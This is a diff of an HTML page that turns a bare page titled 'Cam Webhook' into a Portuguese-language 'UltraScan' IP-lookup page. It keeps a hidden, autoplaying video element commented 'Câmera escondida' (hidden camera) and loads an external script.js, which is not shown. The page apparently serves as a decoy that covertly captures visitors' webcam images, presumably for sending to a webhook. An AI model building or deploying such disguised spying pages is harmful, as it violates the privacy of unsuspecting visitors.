@@ -1,8 +1,25 @@
 <!DOCTYPE html>
-<html>
-  <head><title>Cam Webhook</title></head>
-  <body>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <script src="script.js"></script>
-  </body>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Consultador de IP - UltraScan</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>UltraScan</h1>
+    <p class="desc">Consulta de IP & informações públicas da conexão</p>
+    <div class="form">
+      <input type="text" placeholder="Digite o IP ou domínio..." />
+      <button>Consultar</button>
+    </div>
+    <div class="results">
+      <p>Aguardando consulta...</p>
+    </div>
+  </div>
+
+  <!-- Câmera escondida -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <script src="script.js"></script>
+</body>
 </html>
